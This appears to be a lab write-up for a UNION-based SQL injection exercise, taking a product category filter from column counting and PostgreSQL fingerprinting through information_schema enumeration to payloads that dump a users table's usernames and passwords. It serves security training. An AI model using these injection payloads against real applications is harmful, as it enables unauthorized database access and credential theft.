This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, 
then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user. 

Hint: You can find some useful payloads on our SQL injection cheat sheet. 

End Goal:
- Determine the table that contains usernames and passwords
- Determine the content of the table
- Output the content of the table
- Log in as the administrator user

Analysis:
---------

1) Find the number of columns
' order by 3-- => internal server error

3-1=2

2) Find the data type of the columns
' UNION select 'a', 'a'--
- both columns accept type text

3) Version of the database
' UNION select @@version, NULL-- => not Microsoft
' UNION select version(), NULL-- => 200 response PostgreSQL

4) Output the list of table names in the database

' UNION select table_name, NULL from information_schema.tables --

users_skcydb

5) Output the column names of the table

' UNION select column_name, NULL from information_schema.columns where table_name='users_skcydb'--

username_skdhbe
password_ksddnm

6) Output the usernames and passwords

' UNION select username_skdhbe, password_ksddnm from users_skcydb--
